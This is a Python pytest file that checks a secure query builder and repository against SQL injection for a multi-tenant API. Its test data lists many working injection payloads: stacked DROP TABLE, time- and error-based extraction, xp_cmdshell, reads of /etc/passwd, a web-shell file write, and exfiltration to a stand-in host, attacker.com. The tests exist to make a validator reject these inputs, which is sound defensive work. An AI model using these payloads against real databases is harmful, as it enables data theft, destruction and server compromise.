"""
SQL Injection Prevention Tests
Comprehensive tests for PR-006 SQL injection vulnerability fixes
"""

import pytest
import asyncio
from uuid import UUID, uuid4
from unittest.mock import Mock, AsyncMock, patch

from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy.exc import SQLAlchemyError
from sqlalchemy import text

from src.api.app.infrastructure.secure_query_builder import (
    SecureQueryBuilder, QueryValidationResult, SecurityLevel, QueryType
)
from src.api.app.core.secure_tenant_context import TenantContext
from src.api.app.infrastructure.secure_repositories import SecureRepositoryBase


class TestSQLInjectionVectors:
    """Test various SQL injection attack vectors"""
    
    @pytest.fixture
    def tenant_context(self):
        return TenantContext(
            tenant_id=uuid4(),
            user_id="test-user"
        )
    
    @pytest.fixture
    def query_builder(self, tenant_context):
        return SecureQueryBuilder(tenant_context)
    
    def test_classic_injection_patterns(self, query_builder):
        """Test detection of classic SQL injection patterns"""
        injection_patterns = [
            # Classic OR injection
            "1' OR '1'='1",
            "admin' --",
            "admin' #",
            
            # Union-based injection
            "1' UNION SELECT password FROM users--",
            "' UNION ALL SELECT NULL,username,password FROM users--",
            
            # Boolean-based injection
            "1' AND (SELECT COUNT(*) FROM users) > 0--",
            "1' AND 1=1--",
            "1' AND 1=2--",
            
            # Time-based injection
            "1'; WAITFOR DELAY '00:00:05'--",
            "1' AND (SELECT SLEEP(5))--",
            
            # Stacked queries
            "1'; DROP TABLE users;--",
            "'; INSERT INTO users VALUES ('hacker','pass');--",
            
            # Comment injection
            "admin'/**/OR/**/1=1--",
            "admin' OR 1=1#",
            
            # Hexadecimal injection
            "0x61646D696E",
            
            # Blind injection
            "1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--"
        ]
        
        for pattern in injection_patterns:
            # Test in WHERE conditions
            validation = query_builder.validate_query(
                f"SELECT * FROM users WHERE username = '{pattern}'"
            )
            assert not validation.is_valid, f"Should detect injection in: {pattern}"
            
            # Test that parameterized version is safe
            safe_params = query_builder.build_select(
                "users", 
                where_conditions={"username": pattern}
            )
            validation = query_builder.validate_query(safe_params.query)
            assert validation.is_valid, f"Parameterized query should be safe for: {pattern}"
    
    def test_second_order_injection_prevention(self, query_builder):
        """Test prevention of second-order injection attacks"""
        # Malicious data stored in database, then used in query
        stored_malicious_data = "'; DROP TABLE findings; SELECT '"
        
        # Should be safely parameterized
        params = query_builder.build_select(
            "findings",
            where_conditions={"title": stored_malicious_data}
        )
        
        # Malicious content should be in parameters, not query
        assert "DROP TABLE" not in params.query
        assert params.params["param_0"] == stored_malicious_data
    
    def test_injection_via_order_by(self, query_builder):
        """Test injection attempts via ORDER BY clause"""
        malicious_order_clauses = [
            "id; DROP TABLE users;",
            "id UNION SELECT password FROM users",
            "id,(SELECT password FROM users LIMIT 1)",
            "id' OR '1'='1",
        ]
        
        for clause in malicious_order_clauses:
            with pytest.raises(ValueError, match="Invalid identifier"):
                query_builder.build_select("findings", order_by=[clause])
    
    def test_injection_via_limit_offset(self, query_builder):
        """Test injection via LIMIT/OFFSET parameters"""
        # LIMIT and OFFSET should be converted to integers
        params = query_builder.build_select(
            "findings",
            limit="10; DROP TABLE users;",  # Should be converted to int
            offset="0 UNION SELECT password FROM users"  # Should fail
        )
        
        # Should convert to safe integers or raise error
        assert "LIMIT 10" in params.query or "invalid literal" in str(params.query)
        assert "DROP TABLE" not in params.query
    
    def test_function_injection_prevention(self, query_builder):
        """Test prevention of injection via database functions"""
        malicious_functions = [
            "EXEC xp_cmdshell('dir')",
            "LOAD_FILE('/etc/passwd')",
            "INTO OUTFILE '/tmp/hack.txt'",
            "BENCHMARK(5000000,MD5('test'))",
            "pg_sleep(10)",
            "EXTRACTVALUE(1, CONCAT(0x7e,(SELECT password FROM users),0x7e))"
        ]
        
        for func in malicious_functions:
            validation = query_builder.validate_query(
                f"SELECT {func} FROM users"
            )
            assert not validation.is_valid, f"Should block function: {func}"
    
    def test_information_schema_injection(self, query_builder):
        """Test blocking of information schema attacks"""
        info_schema_queries = [
            "SELECT table_name FROM INFORMATION_SCHEMA.TABLES",
            "SELECT column_name FROM INFORMATION_SCHEMA.COLUMNS",
            "SELECT * FROM sys.tables",
            "SELECT * FROM mysql.user",
            "SELECT * FROM pg_user"
        ]
        
        for query in info_schema_queries:
            validation = query_builder.validate_query(query)
            assert not validation.is_valid, f"Should block info schema query: {query}"
    
    def test_encoding_injection_prevention(self, query_builder):
        """Test prevention of encoding-based injection"""
        encoded_injections = [
            # URL encoded
            "%27%20OR%20%271%27%3D%271",  # ' OR '1'='1
            
            # Hex encoded
            "0x27206F7220273127203D202731",  # ' or '1' = '1
            
            # Unicode encoded
            "\u0027\u0020OR\u0020\u0027\u0031\u0027\u003D\u0027\u0031",
            
            # Double encoding
            "%2527%2520OR%2520%25271%2527%253D%2527",
        ]
        
        for encoded in encoded_injections:
            params = query_builder.build_select(
                "users",
                where_conditions={"username": encoded}
            )
            
            # Encoded content should be safely parameterized
            assert params.params["param_0"] == encoded
            assert "OR" not in params.query or "param_0" in params.query
    
    def test_nosql_injection_in_json_fields(self, query_builder):
        """Test prevention of NoSQL-style injection in JSON fields"""
        nosql_injections = [
            {"$ne": None},
            {"$gt": ""},
            {"$regex": ".*"},
            {"$where": "this.password.length > 0"},
            {"$or": [{"username": "admin"}, {"role": "admin"}]}
        ]
        
        for injection in nosql_injections:
            # Should be safely stored as JSON parameter
            params = query_builder.build_insert(
                "findings",
                {"metadata": injection}
            )
            
            # Injection should be in parameters as JSON, not in query
            assert "param" in str(params.params)
            assert "$ne" not in params.query


class TestVulnerablePatternDetection:
    """Test detection of vulnerable query patterns"""
    
    @pytest.fixture
    def tenant_context(self):
        return TenantContext(tenant_id=uuid4(), user_id="test-user")
    
    @pytest.fixture
    def query_builder(self, tenant_context):
        return SecureQueryBuilder(tenant_context)
    
    def test_detect_string_concatenation(self, query_builder):
        """Test detection of string concatenation in queries"""
        vulnerable_patterns = [
            "SELECT * FROM users WHERE id = " + "user_input",
            f"SELECT * FROM users WHERE name = {'user_input'}",
            "SELECT * FROM users WHERE id = %s" % "user_input",
            "SELECT * FROM users WHERE name = '{}'".format("user_input"),
            "SELECT * FROM users WHERE id = " + str(123),
        ]
        
        for pattern in vulnerable_patterns:
            validation = query_builder.validate_query(pattern)
            # These should be caught by validation
            assert not validation.is_valid or len(validation.warnings) > 0
    
    def test_detect_dynamic_query_construction(self, query_builder):
        """Test detection of dynamic query construction"""
        # Simulate the vulnerable pattern from repositories.py
        update_fields = ["name = :name", "email = :email"]
        dynamic_query = f"UPDATE users SET {', '.join(update_fields)} WHERE id = :id"
        
        validation = query_builder.validate_query(dynamic_query)
        
        # This pattern should be valid when properly parameterized
        assert validation.is_valid
        
        # But raw concatenation should be invalid
        malicious_fields = ["name = :name", "password = 'hacked'; DROP TABLE users; --"]
        malicious_query = f"UPDATE users SET {', '.join(malicious_fields)} WHERE id = :id"
        
        validation = query_builder.validate_query(malicious_query)
        assert not validation.is_valid
    
    def test_detect_unparameterized_text_queries(self, query_builder):
        """Test detection of unparameterized text() queries"""
        dangerous_text_queries = [
            f"SELECT * FROM findings WHERE tenant_id = '{uuid4()}'",
            "DELETE FROM users WHERE name = 'test'",
            "INSERT INTO logs VALUES ('entry', NOW())",
        ]
        
        for query in dangerous_text_queries:
            validation = query_builder.validate_query(query)
            
            # Should warn about string literals
            assert len(validation.warnings) > 0 or not validation.is_valid
            assert any("string literals" in warning for warning in validation.warnings) or not validation.is_valid


class TestSecureRepositoryBase:
    """Test secure repository base class"""
    
    @pytest.fixture
    def mock_session(self):
        session = AsyncMock(spec=AsyncSession)
        session.execute = AsyncMock()
        session.commit = AsyncMock()
        session.rollback = AsyncMock()
        session.flush = AsyncMock()
        return session
    
    @pytest.fixture
    def tenant_context(self):
        return TenantContext(
            tenant_id=uuid4(),
            user_id="test-user"
        )
    
    @pytest.fixture
    def mock_model_class(self):
        class MockModel:
            __tablename__ = "test_table"
            id = None
            tenant_id = None
            name = None
        
        return MockModel
    
    class TestRepository(SecureRepositoryBase):
        """Test implementation of secure repository"""
        
        def _model_to_entity(self, model):
            return {"id": model.id, "name": model.name}
        
        def _entity_to_model(self, entity):
            model = self.model_class()
            model.id = entity.get("id")
            model.name = entity.get("name")
            return model
    
    @pytest.fixture
    def repository(self, mock_session, tenant_context, mock_model_class):
        return self.TestRepository(mock_session, tenant_context, mock_model_class)
    
    @pytest.mark.asyncio
    async def test_repository_requires_valid_context(self, repository):
        """Test repository validates tenant context"""
        # Expire the context
        repository.tenant_context.validated_at = repository.tenant_context.validated_at - pytest.timedelta(hours=1)
        
        with pytest.raises(ValueError, match="Tenant context expired"):
            await repository.get_by_id(uuid4())
    
    @pytest.mark.asyncio
    async def test_repository_enforces_tenant_filtering(self, repository, mock_session):
        """Test repository automatically adds tenant filtering"""
        mock_result = Mock()
        mock_result.scalar_one_or_none.return_value = None
        mock_session.execute.return_value = mock_result
        
        await repository.get_by_id(uuid4())
        
        # Check that execute was called
        mock_session.execute.assert_called_once()
        
        # Get the query that was executed
        call_args = mock_session.execute.call_args[0][0]
        query_str = str(call_args)
        
        # Should include tenant filtering
        assert "tenant_id" in query_str.lower()
    
    @pytest.mark.asyncio
    async def test_repository_prevents_tenant_modification(self, repository, mock_session):
        """Test repository prevents tenant_id modification in updates"""
        malicious_update = {
            "name": "Updated Name",
            "tenant_id": str(uuid4())  # Attempt to change tenant
        }
        
        mock_result = Mock()
        mock_result.scalar_one_or_none.return_value = None
        mock_session.execute.return_value = mock_result
        
        await repository.update(uuid4(), malicious_update)
        
        # Check that the update call was made
        mock_session.execute.assert_called_once()
        
        # Verify tenant_id was not included in update
        call_args = mock_session.execute.call_args
        # The actual validation would be in the secure_update function
    
    @pytest.mark.asyncio
    async def test_repository_logs_data_access(self, repository):
        """Test repository logs data access for audit"""
        with patch.object(repository, '_log_data_access') as mock_log:
            mock_result = Mock()
            mock_result.scalar_one_or_none.return_value = None
            repository.session.execute.return_value = mock_result
            
            await repository.get_by_id(uuid4())
            
            # Should log the access attempt
            mock_log.assert_called_once()


class TestEdgeCasesAndAdvancedAttacks:
    """Test edge cases and advanced attack scenarios"""
    
    @pytest.fixture
    def tenant_context(self):
        return TenantContext(tenant_id=uuid4(), user_id="test-user")
    
    @pytest.fixture
    def query_builder(self, tenant_context):
        return SecureQueryBuilder(tenant_context)
    
    def test_polyglot_injection_detection(self, query_builder):
        """Test detection of polyglot injection payloads"""
        polyglot_payloads = [
            # Universal polyglot
            "SLEEP(1)/*' or SLEEP(1) or '\" or SLEEP(1) or \"*/",
            
            # Multi-database polyglot
            "1';waitfor delay '0:0:5'--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "1' || pg_sleep(5)--",
            
            # XSS + SQL injection polyglot
            "'><script>alert('XSS')</script><!--' AND '1'='1",
        ]
        
        for payload in polyglot_payloads:
            validation = query_builder.validate_query(
                f"SELECT * FROM users WHERE name = '{payload}'"
            )
            assert not validation.is_valid, f"Should detect polyglot: {payload}"
    
    def test_time_based_blind_injection(self, query_builder):
        """Test detection of time-based blind injection"""
        time_based_payloads = [
            "'; WAITFOR DELAY '00:00:05'--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' || pg_sleep(5)--",
            "'; SELECT pg_sleep(5); --",
            "' AND BENCHMARK(5000000,MD5('test'))--"
        ]
        
        for payload in time_based_payloads:
            validation = query_builder.validate_query(
                f"SELECT * FROM users WHERE id = 1{payload}"
            )
            assert not validation.is_valid, f"Should detect time-based injection: {payload}"
    
    def test_out_of_band_injection_detection(self, query_builder):
        """Test detection of out-of-band injection attempts"""
        oob_payloads = [
            # DNS exfiltration
            "'; SELECT LOAD_FILE(CONCAT('\\\\\\\\',version(),'.attacker.com\\\\share'))--",
            
            # HTTP requests
            "'; SELECT * FROM OPENROWSET('MSDASQL','DRIVER={SQL Server};SERVER=attacker.com;','select 1')--",
            
            # File operations
            "' INTO OUTFILE '/tmp/hack.txt'--",
            "' INTO DUMPFILE '/var/www/html/shell.php'--",
        ]
        
        for payload in oob_payloads:
            validation = query_builder.validate_query(
                f"SELECT * FROM users WHERE name = 'test{payload}"
            )
            assert not validation.is_valid, f"Should detect OOB injection: {payload}"
    
    def test_error_based_injection_detection(self, query_builder):
        """Test detection of error-based injection"""
        error_based_payloads = [
            # MySQL error-based
            "' AND EXTRACTVALUE(1, CONCAT(0x7e,(SELECT password FROM users),0x7e))--",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM users GROUP BY x)a)--",
            
            # PostgreSQL error-based
            "' AND (SELECT * FROM generate_series(1,1000000))--",
            "' AND (SELECT CAST((SELECT password FROM users LIMIT 1) AS int))--",
            
            # SQL Server error-based
            "' AND (SELECT CAST((SELECT password FROM users) AS int))--",
        ]
        
        for payload in error_based_payloads:
            validation = query_builder.validate_query(
                f"SELECT * FROM users WHERE id = 1{payload}"
            )
            assert not validation.is_valid, f"Should detect error-based injection: {payload}"
    
    def test_nested_injection_prevention(self, query_builder):
        """Test prevention of nested injection attacks"""
        # Injection within injection
        nested_payload = "admin'; SELECT password FROM users WHERE username='admin' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'; --"
        
        validation = query_builder.validate_query(
            f"SELECT * FROM users WHERE username = '{nested_payload}'"
        )
        
        assert not validation.is_valid
        assert any("dangerous pattern" in error.lower() for error in validation.errors)


class TestRegressionPrevention:
    """Test prevention of regression to vulnerable patterns"""
    
    @pytest.fixture
    def tenant_context(self):
        return TenantContext(tenant_id=uuid4(), user_id="test-user")
    
    def test_prevent_dynamic_query_concatenation_regression(self, tenant_context):
        """Test that we don't regress to dynamic query concatenation"""
        builder = SecureQueryBuilder(tenant_context)
        
        # This pattern was vulnerable in the original code
        update_fields = ["name = :name", "email = :email"]
        
        # Should use secure update builder instead
        secure_params = builder.build_update(
            "users",
            {"name": "John", "email": "john@example.com"},
            {"id": "123"}
        )
        
        # Should be parameterized, not concatenated
        assert ":set_name" in secure_params.query
        assert ":set_email" in secure_params.query
        assert secure_params.params["set_name"] == "John"
        assert "name = 'John'" not in secure_params.query  # Not literal
    
    def test_prevent_text_query_regression(self, tenant_context):
        """Test prevention of regression to unsafe text() queries"""
        builder = SecureQueryBuilder(tenant_context)
        
        # These patterns were vulnerable
        tenant_id = str(uuid4())
        
        # Should validate that tenant_id is parameterized
        unsafe_query = f"SELECT * FROM findings WHERE tenant_id = '{tenant_id}'"
        validation = builder.validate_query(unsafe_query)
        
        # Should fail validation
        assert not validation.is_valid or len(validation.warnings) > 0
        
        # Safe version should pass
        safe_params = builder.build_select(
            "findings",
            where_conditions={"tenant_id": tenant_id}
        )
        safe_validation = builder.validate_query(safe_params.query)
        assert safe_validation.is_valid
    
    def test_prevent_header_tenant_switching_regression(self):
        """Test that header-based tenant switching is permanently disabled"""
        # This was the critical vulnerability - ensure it stays fixed
        from src.api.app.middleware.secure_tenant_middleware import SecureTenantMiddleware
        
        # The middleware should detect header manipulation
        middleware = SecureTenantMiddleware(Mock())
        
        # Should have detection logic
        assert hasattr(middleware, '_detect_header_manipulation')
        
        # Should have suspicious headers list
        suspicious_headers = [
            "X-Tenant-ID", "X-Tenant", "Tenant-ID", 
            "Tenant", "X-Organization-ID", "Organization-ID"
        ]
        
        # These should be in the detection logic
        for header in suspicious_headers:
            # The middleware should be aware of these headers
            assert header in str(middleware._detect_header_manipulation.__code__.co_consts)


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])